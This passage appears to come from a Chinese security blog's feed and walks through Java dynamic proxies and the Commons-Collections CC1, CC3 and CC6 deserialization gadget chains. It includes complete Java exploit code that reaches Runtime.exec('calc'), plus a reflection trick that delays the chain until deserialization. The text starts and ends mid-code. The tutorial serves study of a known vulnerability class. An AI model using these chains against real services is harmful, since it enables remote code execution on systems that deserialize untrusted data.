<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer<span class="comment">//这里替换掉了原本的InvokerTransformer类</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用链</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用链</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line"></span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>反序列化利用成功</p><p><img src="image-20230324215659697.png" alt="image-20230324215659697"></p><p>实际上CC3这条链并没有改变ChainedTransformer.transform()的利用链，只是换了种不需要Runtime类和InvokerTransformer类的ChainedTransformer类对象</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;类的动态加载&quot;&gt;类的动态加载&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Java类的动态加载&lt;/code&gt;是指在运行时，通过程序代码加载并使用Java类，而不需要在编译时将其全部静态加载。这种方式可以让开发者灵活地根据需要加载所需的类，而不必提前把所有的类都加载到内存中，从而节</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之动态代理,cc1和cc6</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/</id>
    <published>2023-03-23T04:58:14.000Z</published>
    <updated>2023-06-14T11:55:14.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态代理">动态代理</h1><p><code>Java动态代理</code>是一种在运行时生成代理对象的机制,它可以在运行时动态地创建一个实现特定接口的代理类,并将所有调用委托给处理器。</p><p>在Java中,动态代理由java.lang.reflect包中的<code>Proxy类</code>和<code>InvocationHandler接口</code>提供支持。要创建动态代理,首先必须定义一个实现InvocationHandler接口的类,该接口只有一个方法invoke(Object proxy, Method method, Object[]  args),它会在代理对象上调用任何方法时被调用。然后,使用Proxy.newProxyInstance()方法来创建代理对象,该方法需要传递一个<code>ClassLoader对象</code>、<code>一组接口</code>以及一个<code>InvocationHandler对象</code>作为参数。</p><p>当代理对象上调用方法时,代理对象将委托给InvocationHandler对象的<code>invoke()</code>方法来处理该方法的调用。在invoke()方法内部,可以根据需要执行其他逻辑,例如记录日志或者进行权限检查,然后再将请求转发给实际的目标对象。这样就可以实现动态代理的功能。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义InvocationHandler实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before Method Invoke&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;After Method Invoke&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建目标对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建InvocationHandler实现类</span></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">proxy</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">                hello.getClass().getClassLoader(),</span><br><span class="line">                hello.getClass().getInterfaces(),</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用动态代理对象的方法</span></span><br><span class="line">        proxy.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before Method Invoke</span><br><span class="line">Hello World</span><br><span class="line">After Method Invoke</span><br></pre></td></tr></table></figure><p>由于<code>不论我们调用任何动态代理对象方法都会执行invoke方法</code>,所以为我们的反序列化利用提供了便利</p><h1 id="CC1链">CC1链</h1><p>我们之前最终的利用链是</p><p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p><p>我们一开始在查找有谁调用了InvokerTransformer.transform()方法的时候找的是TransformedMap的checkSetValue方法,但实际上还有很多其他的调用方法,例如在<code>LazyMap</code>中的<code>get</code>方法也调用了InvokerTransformer.transform()</p><p><img src="image-20230323132610636.png" alt="image-20230323132610636"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们就可以针对这一条链进行尝试</p><p>调用了get的方法很多,这里我们发现在AnnotationInvocationHandler的invoke方法里也调用了get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//调用了get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就涉及到了动态加载</p><p>于是我们需要创建一个动态代理对象,代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//由于最终是调用memberValues.get,所以使用构造方法AnnotationInvocationHandler(type, memberValues) 第二个参数是lazymap</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br></pre></td></tr></table></figure><p>创建完了以后,我们得调用动态代理对象的一个方法,在invoke中有两个if方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    paramTypes[<span class="number">0</span>] == Object.class)<span class="comment">//判断方法名字是否为equals</span></span><br><span class="line">    <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)<span class="comment">//传参是否不为空</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure><p>必须使这两个if语句为假,才会执行到get语句那里,所以选择的方法要求<code>不是equal方法,传参还需为空,同时必须在反序列化中被调用</code>,巧合的是AnnotationInvocationHandler中的readObject刚好就存在这样的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br></pre></td></tr></table></figure><p>这里就调用了<code>memberValues.entrySet()</code>,所以我们要使memberValues=mapproxy（创建的代理对象）</p><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br></pre></td></tr></table></figure><p>故最后的命令执行代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br><span class="line"></span><br><span class="line">Serialize(obj);</span><br><span class="line"><span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20230323154644608.png" alt="image-20230323154644608"></p><h1 id="CC6链">CC6链</h1><p>之前的实验一直都是在jdk为8u65的环境下进行的,这是因为Oracle在<code>jdk8u71</code>版本就修改了AnnotationInvocationHandler的readObject方法,不再直接调用memberValues,导致之前的整条链全都行不通了</p><p>所以我们要找一条所有jdk版本都可以使用的利用链</p><p>之前我们在学URLDNS的时候利用到了HashMap里的readObject方法,这个方法会最终调用key的hashcode方法,而正好有一个TiedMapEntry类中带有hashcode方法,同时这个方法又调用了自己的getValue方法,进而调用了get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是命令执行代码构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure><p>但执行的时候会发现直接就调出了计算器,说明整条链还没序列化就跑完了,原理和URLDNS类似,在HashMap的put方法中,已经调用了hashcode方法,所以我们得通过反射来解决这个问题</p><p><img src="image-20230323170709111.png" alt="image-20230323170709111"></p><p>在put前,我们要让整条链先断开,put完了以后再连上</p><p>这里我们选择断开TiedMapEntry到LazyMap的这条链,将tiedMapEntry对象的实例化代码修改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);<span class="comment">//传入map而不是lazymap</span></span><br></pre></td></tr></table></figure><p>put完了以后在通过反射修改tiedMapEntry对象的map属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br></pre></td></tr></table></figure><p>所以整个命令执行代码修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 